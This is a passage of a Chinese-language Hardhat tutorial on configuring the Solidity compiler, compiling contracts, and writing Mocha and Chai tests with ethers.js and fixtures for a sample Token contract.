class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>我们建议始终设置编译器版本，以避免在发布新版本的 Solidity 时出现意外行为或编译错误。</p><p>扩展的用法允许对编译器进行更多控制：</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">solidity</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">version</span><span class="token operator">:</span> <span class="token string">"0.8.9"</span><span class="token punctuation">,</span>        <span class="token literal-property property">settings</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">optimizer</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token literal-property property">enabled</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                <span class="token literal-property property">runs</span><span class="token operator">:</span> <span class="token number">1000</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><code>settings</code> 与可以传递给编译器的 <a href="https://solidity.readthedocs.io/en/v0.7.2/using-the-compiler.html#input-description">Input JSON</a> 中的 <code>setting</code> 条目具有相同的架构(schema)。一些常用的设置是：</p><ul><li><code>optimizer</code>: 一个有 <code>enabled</code> 和 <code>runs</code> 作为键的对象，默认值为：<code>&#123; enabled: false, runs:200 &#125;</code></li><li><code>evmVersion</code>: 一个控制目标 evm 版本的字符串。例如：<code>istanbul</code>, <code>berlin</code> 或者 <code>london</code>。默认值：由 <code>solc</code> 管理。</li></ul><p>如果您任何合约的版本编译指示(version pragma)不满足您配置的编译器版本，那么 Hardhat 将抛出错误。</p><p>在命令行中运行 <code>npx hardhat compile</code> 可以编译合约。<code>compile</code> 任务是内置任务之一。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ npx hardhat compileCompiling <span class="token number">1</span> <span class="token function">file</span> with <span class="token number">0.8</span>.9Compilation finished successfully<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>合约已被成功编译，可以使用。</p><p>编译任务会将 <code>contracts</code> 目录中的所有合约源文件都进行编译。所有默认情况下，编译的结果将保存在 <code>artifacts/</code> 目录下，或者保存在您配置的路径下。您可以在<a href="https://hardhat.org/hardhat-runner/docs/config#path-configuration">路径配置</a>中了解如何修改。如果目录不存在的话编译之后会自动创建。</p><p>在初次编译之后，Hardhat 将会在下次编译的时候做最少的工作。比如，如果你没有更改某些文件，那么这些文件将不会被重新编译。只有那些更改过的文件会被重新编译。</p><p>如果想要强制编译您可以使用 <code>--force</code> 选项，或者运行 <code>npx hardhat clean</code> 来清除缓存、删除 artifacts。</p><h2 id="4-测试合约"><a href="#4-测试合约" class="headerlink" title="4. 测试合约"></a>4. 测试合约</h2><p>在构建智能合约时编写自动化测试至关重要。为了测试合约，本节将会使用 Hardhat 网络，这是一个专门为开发而设计的本地以太坊网络。它内置在 Hardhat 中，并用作默认网络。无需设置任何内容即可使用它。</p><p>在测试中将会使用 <a href="https://docs.ethers.io/v5/">ethers.js</a> 与第3节构建的合约进行交互，并使用 <a href="https://mochajs.org/">Mocha</a> 作为测试运行器(test runner)。</p><h3 id="编写测试"><a href="#编写测试" class="headerlink" title="编写测试"></a>编写测试</h3><p>在项目根文件夹下新建名为 <code>test</code> 的目录，并创建名为 <code>Token.js</code> 的新文件。将以下代码复制到文件中。</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> expect <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"chai"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">describe</span><span class="token punctuation">(</span><span class="token string">"Token contract"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">it</span><span class="token punctuation">(</span><span class="token string">"Deployment should assign the total supply of tokens to the owner"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">[</span>owner<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">await</span> ethers<span class="token punctuation">.</span><span class="token function">getSigners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> Token <span class="token operator">=</span> <span class="token keyword">await</span> ethers<span class="token punctuation">.</span><span class="token function">getContractFactory</span><span class="token punctuation">(</span><span class="token string">"Token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> hardhatToken <span class="token operator">=</span> <span class="token keyword">await</span> Token<span class="token punctuation">.</span><span class="token function">deploy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> ownerBalance <span class="token operator">=</span> <span class="token keyword">await</span> hardhatToken<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>owner<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">expect</span><span class="token punctuation">(</span><span class="token keyword">await</span> hardhatToken<span class="token punctuation">.</span><span class="token function">totalSupply</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">.</span><span class="token function">equal</span><span class="token punctuation">(</span>ownerBalance<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>在终端中运行 <code>npx hardhat test</code>，应该可以看到下面的输出：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ npx hardhat <span class="token builtin class-name">test</span>  Token contract    ✓ Deployment should assign the total supply of tokens to the owner <span class="token punctuation">(</span>654ms<span class="token punctuation">)</span>  <span class="token number">1</span> passing <span class="token punctuation">(</span>663ms<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这意味着测试通过。现在解释每一行的意思：</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">[</span>owner<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">await</span> ethers<span class="token punctuation">.</span><span class="token function">getSigners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>ethers.js 中的一个 <code>Signer</code> 是表示一个以太坊账户的对象。它用于向合约和其他账户发送交易。在这里，我们获得了我们连接的节点中的帐户列表，在本例中是 Hardhat Network，我们只保留第一个。</p><p><code>ethers</code> 变量在全局范围内可用。如果你希望你的代码总是明确的，可以在顶部添加这一行：</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> ethers <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"hardhat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> Token <span class="token operator">=</span> <span class="token keyword">await</span> ethers<span class="token punctuation">.</span><span class="token function">getContractFactory</span><span class="token punctuation">(</span><span class="token string">"Token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>ethers.js 中的 <code>ContractFactory</code> 是一个用于部署新的智能合约的抽象，因此这里的 <code>Token</code> 是我们的代币合约实例的工厂(factory)。这里的 <code>ethers.getContractFactory()</code> 和上面的 <code>ethers.getSigners()</code> 并不包含在 ethers 官方依赖中，而是 Hardhat 添加到 ethers 对象中的助手(helper)。<a href="https://github.com/NomicFoundation/hardhat/tree/master/packages/hardhat-ethers#helpers">Helpers</a> 给出了 hardhat-ethers 插件为 ethers 库添加的助手（包括接口及函数声明）。</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> hardhatToken <span class="token operator">=</span> <span class="token keyword">await</span> Token<span class="token punctuation">.</span><span class="token function">deploy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>调用 <code>ContractFactory</code> 对象上的 <code>deploy()</code> 将会启动部署，并且返回一个可以解析为 <code>Contract</code> 的 <code>Promise</code>。这是为每个智能合约函数提供方法的对象。</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> ownerBalance <span class="token operator">=</span> <span class="token keyword">await</span> hardhatToken<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>owner<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>部署合约后，我们可以在 <code>hardhatToken</code> 上调用合约方法。这里我们通过调用合约的 <code>balanceOf()</code> 方法获取所有者账户的余额。</p><p>回想一下，部署 token 的帐户获得了全部供应。默认情况下，<code>ContractFactory</code> 和 <code>Contract</code> 实例连接到第一个签名者(signer)。这意味着 <code>owner</code> 变量中的账户执行了部署，而 <code>balanceOf()</code> 应该返回全部供应量。</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">expect</span><span class="token punctuation">(</span><span class="token keyword">await</span> hardhatToken<span class="token punctuation">.</span><span class="token function">totalSupply</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">.</span><span class="token function">equal</span><span class="token punctuation">(</span>ownerBalance<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>在这里，我们再次使用我们的 <code>Contract</code> 实例在我们的 Solidity 代码中调用智能合约函数。 <code>totalSupply()</code> 返回代币的供应量，我们正在检查它是否等于 <code>ownerBalance</code>，它应该是相等的。</p><p>为此，我们使用了流行的 JavaScript 断言库(assertion library) <a href="https://www.chaijs.com/">Chai</a>。这些断言函数称为“匹配器(matchers)”，我们在这里使用的函数来自 <a href="https://hardhat.org/hardhat-runner/plugins/nomicfoundation-hardhat-chai-matchers"><code>@nomicfoundation/hardhat-c​​hai-matchers</code></a> 插件，它用许多对测试智能合约有用的匹配器扩展了 Chai。</p><h4 id="使用一个不同的账户"><a href="#使用一个不同的账户" class="headerlink" title="使用一个不同的账户"></a>使用一个不同的账户</h4><p>如果您需要通过从一个账户(或 ethers.js 术语中的 <code>Signer</code>)而不是默认账户发送一个交易来测试您的代码，您可以使用 ethers.js <code>Contract</code> 对象上的 <code>connect()</code> 方法将其连接到不同的帐户，像这样：</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> expect <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"chai"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">describe</span><span class="token punctuation">(</span><span class="token string">"Token contract"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// ...previous test...</span>    <span class="token function">it</span><span class="token punctuation">(</span><span class="token string">"Should transfer tokens between accounts"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">[</span>owner<span class="token punctuation">,</span> addr1<span class="token punctuation">,</span> addr2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">await</span> ethers<span class="token punctuation">.</span><span class="token function">getSigners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> Token <span class="token operator">=</span> <span class="token keyword">await</span> ethers<span class="token punctuation">.</span><span class="token function">getContractFactory</span><span class="token punctuation">(</span><span class="token string">"Token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> hardhatToken <span class="token operator">=</span> <span class="token keyword">await</span> Token<span class="token punctuation">.</span><span class="token function">deploy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Transfer 50 tokens from owner to addr1</span>        <span class="token keyword">await</span> hardhatToken<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>addr1<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">expect</span><span class="token punctuation">(</span><span class="token keyword">await</span> hardhatToken<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>addr1<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">.</span><span class="token function">equal</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Transfer 50 tokens from addr1 to addr2</span>        <span class="token keyword">await</span> hardhatToken<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>addr1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>addr2<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">expect</span><span class="token punctuation">(</span><span class="token keyword">await</span> hardhatToken<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>addr2<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">.</span><span class="token function">equal</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><code>contract.connect(providerOrSigner)</code> 将会返回一个新的连接到 <em>providerOrSigner</em> 的 Contract 示例。</p><h4 id="使用-fixtures-重用常见的测试设置"><a href="#使用-fixtures-重用常见的测试设置" class="headerlink" title="使用 fixtures 重用常见的测试设置"></a>使用 fixtures 重用常见的测试设置</h4><p>我们在上面编写了两个测试（代币总量和代币转账），在这个案例中这意味着部署代币合约。在更复杂的项目中，此设置可能涉及多个部署和其他交易(transaction)。在每次测试中都这样做意味着大量的代码重复。另外，在每个测试开始时执行许多交易会使测试套件变得更慢。</p><p>您可以通过使用 <strong>fixtures</strong> 来避免代码重复并提高测试套件的性能。一个 fixture 是一个设置函数，仅在第一次调用时运行。在随后的调用中，Hardhat 不会重新运行它，而是将网络的状态重置为 fixture 最初执行后的状态。</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> loadFixture <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"@nomicfoundation/hardhat-network-helpers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> expect <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"chai"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">describe</span><span class="token punctuation">(</span><span class="token string">"Token contract"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">deployTokenFixture</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> Token <span class="token operator">=</span> <span class="token keyword">await</span> ethers<span class="token punctuation">.</span><span class="token function">getContractFactory</span><span class="token punctuation">(</span><span class="token string">"Token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> <span class="token punctuation">[</span>owner<span class="token punctuation">,</span> addr1<span class="token punctuation">,</span> addr2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">await</span> ethers<span class="token punctuation">.</span><span class="token function">getSigners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> hardhatToken <span class="token operator">=</span> <span class="token keyword">await</span> Token<span class="token punctuation">.</span><span class="token function">deploy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> hardhatToken<span class="token punctuation">.</span><span class="token function">deployed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Fixtures can return anything you consider useful for your tests</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span> Token<span class="token punctuation">,</span> hardhatToken<span class="token punctuation">,</span> owner<span class="token punctuation">,</span> addr1<span class="token punctuation">,</span> addr2 <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">it</span><span class="token punctuation">(</span><span class="token string">"Should assign the total supply of tokens to the owner"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> hardhatToken<span class="token punctuation">,</span> owner <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">loadFixture</span><span class="token punctuation">(</span>deployTokenFixture<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> ownerBalance <span class="token operator">=</span> <span class="token keyword">await</span> hardhatToken<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>owner<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">expect</span><span class="token punctuation">(</span><span class="token keyword">await</span> hardhatToken<span class="token punctuation">.</span><span class="token function">totalSupply</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">.</span><span class="token function">equal</span><span class="token punctuation">(</span>ownerBalance<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">it</span><span class="token punctuation">(</span><span class="token string">"Should transfer tokens between accounts"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> hardhatToken<span class="token punctuation">,</span> owner<span class="token punctuation">,</span> addr1<span class="token punctuation">,</span> addr2 <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">loadFixture</span><span class="token punctuation">(</span>            deployTokenFixture        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Transfer 50 tokens from owner to addr1</span>        <span class="token keyword">await</span> <span class="token function">expect</span><span class="token punctuation">(</span>            hardhatToken<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>addr1<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">.</span><span class="token function">changeTokenBalances</span><span class="token punctuation">(</span>hardhatToken<span class="token punctuation">,</span> <span class="token punctuation">[</span>owner<span class="token punctuation">,</span> addr1<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Transfer 50 tokens from addr1 to addr2</span>        <span class="token comment">// We use .connect(signer) to send a transaction from another account</span>        <span class="token keyword">await</span> <span class="token function">expect</span><span class="token punctuation">(</span>            hardhatToken<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>addr1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>addr2<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">.</span><span class="token function">changeTokenBalances</span><span class="token punctuation">(</span>hardhatToken<span class="token punctuation">,</span> <span class="token punctuation">[</span>addr1<span class="token punctuation">,</span> addr2<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>在这里，我们编写了一个 <code>deployTokenFixture</code> 函数，它进行必要的设置并返回我们稍后在测试中使用的每个值。然后在每个测试中，我们使用 <code>loadFixture</code> 运行 fixture 并获取这些值。 <code>loadFixture</code> 将在第一次运行设置，并在其他测试中快速返回到该状态。</p><h4 id="完全覆盖"><a href="#完全覆盖" class="headerlink" title="完全覆盖"></a>完全覆盖</h4><p>现在我们已经介绍了测试合约所需的基础知识，这里有一个完整的代币测试套件，其中包含许多关于 Mocha 以及如何构建测试的附加信息。建议仔细阅读。</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// This is an example test file. Hardhat will run every *.js file in `test/`,</span><span class="token comment">// so feel free to add new ones.</span><span class="token comment">// Hardhat tests are normally written with Mocha and Chai.</span><span class="token comment">// We import Chai to use its asserting functions here.</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> expect <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"chai"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// We use `loadFixture` to share common setups (or fixtures) between tests.</span><span class="token comment">// Using this simplifies your tests and makes them run faster, by taking</span><span class="token comment">// advantage of Hardhat Network's snapshot functionality.</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> loadFixture <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"@nomicfoundation/hardhat-network-helpers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// `describe` is a Mocha function that allows you to organize your tests.</span><span class="token comment">// Having your tests organized makes debugging them easier. All Mocha</span><span class="token comment">// functions are available in the global scope.</span><span class="token comment">//</span><span class="token comment">// `describe` receives the name of a section of your test suite, and a</span><span class="token comment">// callback. The callback must define the tests of that section. This callback</span><span class="token comment">// can't be an async function.</span><span class="token function">describe</span><span class="token punctuation">(</span><span class="token string">"Token contract"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// We define a fixture to reuse the same setup in every test. We use</span>    <span class="token comment">// loadFixture to run this setup once, snapshot that state, and reset Hardhat</span>    <span class="token comment">// Network to that snapshot in every test.</span>    <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">deployTokenFixture</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Get the ContractFactory and Signers here.</span>        <span class="token keyword">const</span> Token <span class="token operator">=</span> <span class="token keyword">await</span> ethers<span class="token punctuation">.</span><span class="token function">getContractFactory</span><span class="token punctuation">(</span><span class="token string">"Token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> <span class="token punctuation">[</span>owner<span class="token punctuation">,</span> addr1<span class="token punctuation">,</span> addr2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">await</span> ethers<span class="token punctuation">.</span><span class="token function">getSigners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// To deploy our contract, we just have to call Token.deploy() and await</span>        <span class="token comment">// its deployed() method, which happens onces its transaction has been</span>        <span class="token comment">// mined.</span>        <span class="token keyword">const</span> hardhatToken <span class="token operator">=</span> <span class="token keyword">await</span> Token<span class="token punctuation">.</span><span class="token function">deploy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> hardhatToken<span class="token punctuation">.</span><span class="token function">deployed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Fixtures can return anything you consider useful for your tests</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span> Token<span class="token punctuation">,</span> hardhatToken<span class="token punctuation">,</span> owner<span class="token punctuation">,</span> addr1<span class="token punctuation">,</span> addr2 <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// You can nest describe calls to create subsections.</span>    <span class="token function">describe</span><span class="token punctuation">(</span><span class="token string">"Deployment"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// `it` is another Mocha function. This is the one you use to define each</span>        <span class="token comment">// of your tests. It receives the test name, and a callback function.</span>        <span class="token comment">//</span>        <span class="token comment">// If the callback function is async, Mocha will `await` it.</span>        <span class="token function">it</span><span class="token punctuation">(</span><span class="token string">"Should set the right owner"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// We use loadFixture to setup our environment, and then assert that</span>        <span class="token comment">// things went well</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> hardhatToken<span class="token punctuation">,</span> owner <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">loadFixture</span><span class="token punctuation">(</span>deployTokenFixture<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// `expect` receives a value and wraps it in an assertion object. These</span>        <span class="token comment">// objects have a lot of utility methods to assert values.</span>        <span class="token comment">// This test expects the owner variable stored in the contract to be</span>        <span class="token comment">// equal to our Signer's owner.</span>        <span class="token function">expect</span><span class="token punctuation">(</span><span class="token keyword">await</span> hardhatToken<span class="token punctuation">.</span><span class="token function">owner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">.</span><span class="token function">equal</span><span class="token punctuation">(</span>owner<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">it</span><span class="token punctuation">(</span><span class="token string">"Should assign the total supply of tokens to the owner"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> hardhatToken<span class="token punctuation">,</span> owner <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">loadFixture</span><span class="token punctuation">(</span>deployTokenFixture<span class="token punctuation">)</span><span class="token 